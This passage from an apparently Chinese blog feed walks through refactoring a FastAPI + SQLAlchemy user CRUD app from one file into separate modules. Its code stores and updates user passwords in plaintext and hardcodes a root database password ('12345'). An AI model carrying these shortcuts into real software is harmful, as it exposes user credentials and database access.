class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, HTTPException, Depends<br><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel <span class="hljs-keyword">as</span> SchemaBaseModel<br><br><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine, Column, String, Integer<br><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base<br><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker, Session<br><br>pymysql.install_as_MySQLdb()<br><br><br>DATABASE_URL = <span class="hljs-string">&quot;mysql://root:12345@localhost:3306/db&quot;</span><br>engine = create_engine(DATABASE_URL)<br>SessionLocal = sessionmaker(bind=engine)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db</span>():<br>    db: Session = SessionLocal()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">yield</span> db<br>    <span class="hljs-keyword">finally</span>:<br>        db.close()<br><br><br>BaseModel = declarative_base()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    __tablename__ = <span class="hljs-string">&quot;users&quot;</span><br><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, index=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>)<br>    name = Column(String(<span class="hljs-number">255</span>))<br>    password = Column(String(<span class="hljs-number">255</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;id: <span class="hljs-subst">&#123;self.<span class="hljs-built_in">id</span>&#125;</span>, name: <span class="hljs-subst">&#123;self.name&#125;</span>, password: <span class="hljs-subst">&#123;self.password&#125;</span>&quot;</span><br><br><br>app = FastAPI(title=<span class="hljs-string">&quot;FastAPI + SqlAlchemy&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBase</span>(<span class="hljs-title class_ inherited__">SchemaBaseModel</span>):<br>    name: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserIn</span>(<span class="hljs-title class_ inherited__">UserBase</span>):<br>    password: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserOut</span>(<span class="hljs-title class_ inherited__">UserBase</span>):<br>    <span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span><br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span>:<br>        orm_mode = <span class="hljs-literal">True</span>     <span class="hljs-comment"># 设置后 response_model=UserOut时，才能直接返回 db_user</span><br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/user&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_user</span>(<span class="hljs-params">user: UserIn, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    <span class="hljs-comment"># db_user = User(name=user.name, password=user.password)</span><br>    db_user = User(**user.<span class="hljs-built_in">dict</span>())       <span class="hljs-comment"># 和上面的用法是等价的</span><br>    db.add(db_user)<br>    db.commit()<br>    db.refresh(db_user)     <span class="hljs-comment"># refresh之后，db_user才有数据</span><br>    <span class="hljs-keyword">return</span> db_user<br><br><br><span class="hljs-meta">@app.put(<span class="hljs-params"><span class="hljs-string">&quot;/user/&#123;user_id&#125;&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, user: UserIn, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    db_user = db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> == user_id).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> db_user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">f&quot;Not found user with id: <span class="hljs-subst">&#123;user_id&#125;</span>&quot;</span>, status_code=<span class="hljs-number">404</span>)<br>    db_user.name = user.name<br>    db_user.password = user.password<br>    db.commit()<br>    db.refresh(db_user)<br>    <span class="hljs-keyword">return</span> db_user<br></code></pre></td></tr></table></figure><h1 id="8-9-项目代码结构调整【重点】"><a href="#8-9-项目代码结构调整【重点】" class="headerlink" title="8-9 项目代码结构调整【重点】"></a>8-9 项目代码结构调整【重点】</h1><p>目前，我们已经实现了FastAPI和SQLAlchemy的集成，但是发现，项目的所有代码都在一个Python文件中。</p><p>这样会造成代码结构不清楚，层次不清晰，代码可读性差，维护成本高。</p><p>因此，需要做代码拆分，按照功能拆分成不同的Python文件。</p><ul><li>项目完整代码示例（一个文件版本）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> typing<br><span class="hljs-keyword">import</span> pymysql<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, HTTPException, Depends<br><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel <span class="hljs-keyword">as</span> SchemaBaseModel<br><br><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine, Column, String, Integer<br><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base<br><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker, Session<br><br>pymysql.install_as_MySQLdb()<br><br><br>DATABASE_URL = <span class="hljs-string">&quot;mysql://root:12345@localhost:3306/db&quot;</span><br>engine = create_engine(DATABASE_URL)<br>SessionLocal = sessionmaker(bind=engine)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db</span>():<br>    db: Session = SessionLocal()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">yield</span> db<br>    <span class="hljs-keyword">finally</span>:<br>        db.close()<br><br><br>BaseModel = declarative_base()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    __tablename__ = <span class="hljs-string">&quot;users&quot;</span><br><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, index=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>)<br>    name = Column(String(<span class="hljs-number">255</span>))<br>    password = Column(String(<span class="hljs-number">255</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;id: <span class="hljs-subst">&#123;self.<span class="hljs-built_in">id</span>&#125;</span>, name: <span class="hljs-subst">&#123;self.name&#125;</span>, password: <span class="hljs-subst">&#123;self.password&#125;</span>&quot;</span><br><br><br>app = FastAPI(title=<span class="hljs-string">&quot;FastAPI + SqlAlchemy&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBase</span>(<span class="hljs-title class_ inherited__">SchemaBaseModel</span>):<br>    name: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserIn</span>(<span class="hljs-title class_ inherited__">UserBase</span>):<br>    password: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserOut</span>(<span class="hljs-title class_ inherited__">UserBase</span>):<br>    <span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span><br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span>:<br>        orm_mode = <span class="hljs-literal">True</span>     <span class="hljs-comment"># 设置后 response_model=UserOut时，才能直接返回 db_user</span><br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/users&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-number">3</span>, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    users: typing.<span class="hljs-type">List</span>[User] = db.query(User).<span class="hljs-built_in">all</span>()[(page - <span class="hljs-number">1</span>) * size:page * size]<br>    <span class="hljs-keyword">return</span> [&#123;<span class="hljs-string">&quot;id&quot;</span>: u.<span class="hljs-built_in">id</span>, <span class="hljs-string">&quot;name&quot;</span>: u.name&#125; <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> users]<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/user/&#123;user_id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    user: User = db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> == user_id).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">f&quot;Not found user with id: <span class="hljs-subst">&#123;user_id&#125;</span>&quot;</span>, status_code=<span class="hljs-number">404</span>)<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;id&quot;</span>: user.<span class="hljs-built_in">id</span>, <span class="hljs-string">&quot;name&quot;</span>: user.name&#125;<br><br><br><span class="hljs-meta">@app.delete(<span class="hljs-params"><span class="hljs-string">&quot;/user/&#123;user_id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> == user_id).delete()<br>    db.commit()<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>&#125;<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/user&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_user</span>(<span class="hljs-params">user: UserIn, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    <span class="hljs-comment"># db_user = User(name=user.name, password=user.password)</span><br>    db_user = User(**user.<span class="hljs-built_in">dict</span>())       <span class="hljs-comment"># 和上面的用法是等价的</span><br>    db.add(db_user)<br>    db.commit()<br>    db.refresh(db_user)     <span class="hljs-comment"># refresh之后，db_user才有数据</span><br>    <span class="hljs-keyword">return</span> db_user<br><br><br><span class="hljs-meta">@app.put(<span class="hljs-params"><span class="hljs-string">&quot;/user/&#123;user_id&#125;&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, user: UserIn, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    db_user = db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> == user_id).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> db_user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">f&quot;Not found user with id: <span class="hljs-subst">&#123;user_id&#125;</span>&quot;</span>, status_code=<span class="hljs-number">404</span>)<br>    db_user.name = user.name<br>    db_user.password = user.password<br>    db.commit()<br>    db.refresh(db_user)<br>    <span class="hljs-keyword">return</span> db_user<br></code></pre></td></tr></table></figure><p><strong>拆分后的项目结构</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">── sql_app<br>    ├── main.py<span class="hljs-comment"># 程序入口</span><br>    ├── crud.py<span class="hljs-comment"># 增删查改的方法</span><br>    ├── database.py<span class="hljs-comment"># 数据库相关</span><br>    ├── models.py<span class="hljs-comment"># ORM模型类相关</span><br>    └── schemas.py<span class="hljs-comment"># Pydantic的BaseModel，校验相关</span><br></code></pre></td></tr></table></figure><ul><li>database.py   # 数据库相关的配置</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql<br><br><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine<br><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker, Session<br><br>pymysql.install_as_MySQLdb()<br><br><br>DATABASE_URL = <span class="hljs-string">&quot;mysql://root:12345@localhost:3306/db&quot;</span><br>engine = create_engine(DATABASE_URL)<br>SessionLocal = sessionmaker(bind=engine)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db</span>():<br>    db: Session = SessionLocal()  <span class="hljs-comment"># db对象出来了</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">yield</span> db<br>    <span class="hljs-keyword">finally</span>:<br>        db.close()<br></code></pre></td></tr></table></figure><ul><li>models.py    # ORM模型相关代码–建立与表对应的模型类</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, String, Integer<br><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base<br><br><br>BaseModel = declarative_base()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):  <span class="hljs-comment"># 创建一个模型类 定义表名字段</span><br>    __tablename__ = <span class="hljs-string">&quot;users&quot;</span><br><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, index=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>)<br>    name = Column(String(<span class="hljs-number">255</span>))<br>    password = Column(String(<span class="hljs-number">255</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;id: <span class="hljs-subst">&#123;self.<span class="hljs-built_in">id</span>&#125;</span>, name: <span class="hljs-subst">&#123;self.name&#125;</span>, password: <span class="hljs-subst">&#123;self.password&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><ul><li>schemas.py    # Pydantic的BaseModel，校验相关</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBase</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    name: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserIn</span>(<span class="hljs-title class_ inherited__">UserBase</span>): <span class="hljs-comment"># 输入的 用的响应模型</span><br>    password: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserOut</span>(<span class="hljs-title class_ inherited__">UserBase</span>): <span class="hljs-comment"># 输出用的 响应模型，输出要屏蔽密码</span><br>    <span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span><br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span>:<br>        orm_mode = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><ul><li>crud.py</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> typing<br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> HTTPException<br><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> Session<br><br><span class="hljs-keyword">from</span> models <span class="hljs-keyword">import</span> User<br><span class="hljs-keyword">from</span> schemas <span class="hljs-keyword">import</span> UserIn<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span>, size: <span class="hljs-built_in">int</span>, db: Session</span>) -&gt; typing.<span class="hljs-type">List</span>[User]:<br>    users: typing.<span class="hljs-type">List</span>[User] = db.query(User).<span class="hljs-built_in">all</span>()[(page - <span class="hljs-number">1</span>) * size:page * size]<br>    <span class="hljs-keyword">return</span> users<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, db: Session</span>) -&gt; User:<br>    user: User = db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> == user_id).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">f&quot;Not found user with id: <span class="hljs-subst">&#123;user_id&#125;</span>&quot;</span>, status_code=<span class="hljs-number">404</span>)<br>    <span class="hljs-keyword">return</span> user<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, db: Session</span>):<br>    db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> == user_id).delete()<br>    db.commit()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_user</span>(<span class="hljs-params">user: UserIn, db: Session</span>) -&gt; User:<br>    <span class="hljs-comment"># db_user = User(name=user.name, password=user.password)</span><br>    db_user = User(**user.<span class="hljs-built_in">dict</span>())  <span class="hljs-comment"># 和上面的用法是等价的</span><br>    db.add(db_user)<br>    db.commit()<br>    db.refresh(db_user)  <span class="hljs-comment"># refresh之后，db_user才有数据</span><br>    <span class="hljs-keyword">return</span> db_user<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, user: UserIn, db: Session</span>) -&gt; User:<br>    db_user = db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> == user_id).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> db_user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">f&quot;Not found user with id: <span class="hljs-subst">&#123;user_id&#125;</span>&quot;</span>, status_code=<span class="hljs-number">404</span>)<br>    db_user.name = user.name<br>    db_user.password = user.password<br>    db.commit()<br>    db.refresh(db_user)<br>    <span class="hljs-keyword">return</span> db_user<br></code></pre></td></tr></table></figure><ul><li>main.py     # 程序主入口，定义接口</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> typing<br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Depends<br><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> Session<br><br><span class="hljs-keyword">import</span> crud<br><span class="hljs-keyword">from</span> models <span class="hljs-keyword">import</span> User<br><span class="hljs-keyword">from</span> database <span class="hljs-keyword">import</span> get_db<br><span class="hljs-keyword">from</span> schemas <span class="hljs-keyword">import</span> UserIn, UserOut<br><br>app = FastAPI(title=<span class="hljs-string">&quot;FastAPI + SqlAlchemy&quot;</span>)<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/users&quot;</span>, response_model=typing.<span class="hljs-type">List</span>[UserOut]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-number">3</span>, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    user = crud.get_users(page, size, db)<br>    <span class="hljs-keyword">return</span> user<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/user/&#123;user_id&#125;&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    user: User = crud.get_user_by_id(user_id, db)<br>    <span class="hljs-keyword">return</span> user<br><br><br><span class="hljs-meta">@app.delete(<span class="hljs-params"><span class="hljs-string">&quot;/user/&#123;user_id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    crud.delete_user_by_id(user_id, db)<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>&#125;<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/user&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_user</span>(<span class="hljs-params">user: UserIn, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    <span class="hljs-keyword">return</span> crud.create_user(user, db)<br><br><br><span class="hljs-meta">@app.put(<span class="hljs-params"><span class="hljs-string">&quot;/user/&#123;user_id&#125;&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, user: UserIn, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    <span class="hljs-keyword">return</span> crud.update_user(user_id, user, db)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>编程，web开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【other】UML类图简单学习笔记</title>
    <link href="/2024/02/26/906UML%E7%B1%BB%E5%9B%BE%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/02/26/906UML%E7%B1%BB%E5%9B%BE%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
